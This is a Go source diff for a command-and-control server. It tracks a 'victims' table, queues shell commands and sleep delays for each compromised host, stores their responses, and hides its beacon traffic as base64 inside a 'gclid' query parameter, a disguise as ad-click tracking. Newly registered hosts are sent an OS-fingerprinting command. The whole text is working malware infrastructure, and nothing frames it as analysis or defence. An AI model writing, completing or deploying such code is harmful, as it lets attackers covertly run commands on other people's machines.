@@ -22,6 +22,7 @@ type VictimsResponse struct {
   Ip string
 }
 
+
 type ValueResponse struct {
   All string
 }
@@ -33,9 +34,10 @@ func errorStatment(err error) {
 }
 
 func saveResponse(x []byte) bool{
+  var uid string
 	value := strings.Split(string(x), "==")
-	fmt.Print("Valor: %s\n", value)
-	err = db.QueryRow("SELECT uid FROM victims WHERE uid = ?", value[0]).Scan(&value[0])
+	fmt.Printf("Valor: %s\n", value)
+	err = db.QueryRow("SELECT uid FROM victims WHERE uid = ?", strings.Split(string(value[0]), ";")[1]).Scan(&uid)
 	fmt.Print(err)
 	if err != nil {
     // Create
@@ -47,17 +49,28 @@ func saveResponse(x []byte) bool{
 		return true
 	} else {
     // Update FIX IT
-    // user id (of controller)==respose==status
-		status, err := db.Prepare("UPDATE command SET response = ? and status = ? WHERE uid = ?")
-    status.Exec(value[1], value[2], value[0])
-    fmt.Print("New command: %s\n", status)
+    // command id (of command);user id==respose==status
+		status, err := db.Prepare("UPDATE command SET response = ?, status = ? WHERE id = ?")
+    status.Exec(value[1], value[2], strings.Split(string(value[0]), ";")[0])
     errorStatment(err)
+    status.Close()
 		return false
 	}
 }
 
-func queryCommand(x []byte) string {
-  return "Query db for command"
+func queryCommand(x []byte) [3]string{
+  // command id;user id==...
+  uid := strings.Split(string(strings.Split(string(x), "==")[0]), ";")[1]
+  var response [3]string
+  rows, err := db.Query("SELECT id, run, sleep FROM command WHERE uid = ? AND status IS NULL", uid)
+  errorStatment(err)
+
+  for rows.Next() {
+    err = rows.Scan(&response[0], &response[1], &response[2])
+    errorStatment(err)
+
+  }
+  return response
 }
 
 func addCommand(w http.ResponseWriter, r *http.Request){
@@ -67,10 +80,11 @@ func addCommand(w http.ResponseWriter, r *http.Request){
   sleep := r.FormValue("sleep")
   // Create
   // uid==command==time of response
-  add, err := db.Prepare("INSERT INTO command (uid, run, sleep) VALUES(?, ?, ?)")
+  add, err := db.Prepare("INSERT INTO command (uid, run, sleep, response, status) VALUES(?, ?, ?, NULL, NULL)")
   errorStatment(err)
   add.Exec(uid, run, sleep)
   w.WriteHeader(http.StatusCreated)
+  add.Close()
   fmt.Printf("----\ncommand: %s\nuid: %s\nsleep: %s", run, uid, sleep)
 }
 
@@ -97,7 +111,7 @@ func pageAPI(w http.ResponseWriter, r *http.Request) {
 
 func proccessData(w http.ResponseWriter, r *http.Request) {
   var command string // Command to running
-  var number int // If is new sending id or if was recorded send time delay to next request
+  var number string // If is new sending id or if was recorded send time delay to next request
 	value, err := base64.StdEncoding.DecodeString(string(r.URL.Query()["gclid"][0]))
 	errorStatment(err)
 
@@ -106,9 +120,11 @@ func proccessData(w http.ResponseWriter, r *http.Request) {
     err = db.QueryRow("SELECT uid FROM victims ORDER BY uid DESC LIMIT 1").Scan(&number)
     command = "grep 'PRETTY_NAME' /etc/os-release"
   } else {
-    // Found
-    command = queryCommand(value)
-    number = 0
+    // Found: query [0]=>id, [1]=> command, [2]=> delay
+    query := queryCommand(value)
+    command = query[1]
+    number = fmt.Sprintf("%s;%s", query[2], query[0])
+    fmt.Printf(command)
   }
   // command==number(delay or uid)
   all := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s==%v", command, number)))
